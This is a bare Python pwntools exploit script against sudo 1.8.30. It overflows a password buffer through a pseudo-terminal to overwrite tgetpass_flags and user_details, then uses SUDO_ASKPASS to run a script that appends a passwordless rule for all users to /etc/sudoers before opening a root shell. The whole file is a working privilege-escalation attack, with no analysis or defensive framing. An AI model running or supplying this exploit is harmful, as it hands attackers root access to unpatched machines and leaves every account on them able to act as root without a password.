#!/usr/bin/env python3
from pwn import *
import pty
import os
import tempfile

bin_file = '/usr/bin/sudo'   # sudo-1.8.30_amd64
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

binf = ELF(bin_file)
offset_buf              = binf.symbols['buf.6101']
offset_tgetpass_flags   = binf.symbols['tgetpass_flags']
offset_user_details     = binf.symbols['user_details']

#==========

check_sudo = lambda : os.system('sudo -S -l < /dev/null >&0 2>&0') == 0

def attack():
    master, slave = pty.openpty()

    exploit  = b'\x00\x15'*(offset_tgetpass_flags - offset_buf)
    exploit += p32(0x6)
    exploit  = exploit.ljust(offset_user_details - offset_buf)
    exploit += p32(1)*4
    exploit += p32(0)*5

    fp = tempfile.NamedTemporaryFile()
    fp.write(b'#!/bin/sh\necho "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers')
    fp.file.close()
    os.chmod(fp.name, 0o755)

    cmd = 'SUDO_ASKPASS={} sudo -S x < {}'.format(fp.name, os.ttyname(slave))
    conn = process(cmd, shell = True)

    conn.recvuntil(': ')
    os.write(master, exploit + b'\n')

    while not check_sudo():
        sleep(1)

    fp.close()

#==========

def main():
    if not check_sudo():
        attack()
    os.system('sudo bash')

if __name__=='__main__':
    main()

#==========
